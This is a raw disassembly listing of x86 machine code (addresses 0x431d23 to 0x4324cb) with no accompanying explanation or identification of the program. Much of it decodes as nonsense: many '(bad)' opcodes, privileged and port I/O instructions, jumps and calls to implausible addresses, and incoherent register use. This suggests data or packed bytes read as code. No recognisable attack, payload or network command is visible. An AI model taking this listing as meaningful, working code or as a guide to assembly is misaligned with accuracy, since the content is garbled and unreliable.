  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
